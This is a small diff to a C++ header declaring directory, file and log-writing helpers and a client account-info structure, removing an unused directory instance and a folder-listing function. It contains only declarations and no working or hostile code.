@@ -19,10 +19,9 @@ struct ClientInfo {
 } static clientInfo, *pClientInfo;
 
 struct BDirectory {
-  std::string folder;
   std::string name;
   std::string path;
-} static mainDir, encrDir;
+} static mainDir;
 
 namespace Stream {
 class LogFile {
@@ -36,16 +35,13 @@ class LogFile {
 															  Path(path),
 															  Name(name),
 															  PathFull(path + name) {}
-};
+} static *logFile;
 
 std::string GetPath(const std::string &dir = "");
 bool MakeDir(const std::string &path, const std::string &name, DWORD fileAttribute = FILE_ATTRIBUTE_NORMAL);
 bool MakeFile(const std::string &fileName, const std::string &path);
 bool WriteLog(const std::string &input, int active, bool blockProcessInfo = false);
 void GetAccountInfo(ClientInfo *data);
-std::vector<std::filesystem::path> GetAllFilesInFolder(const std::string &firstFile);
-
-static Stream::LogFile *logFile;
 }
 
 #endif //BLXR__STREAM_H_
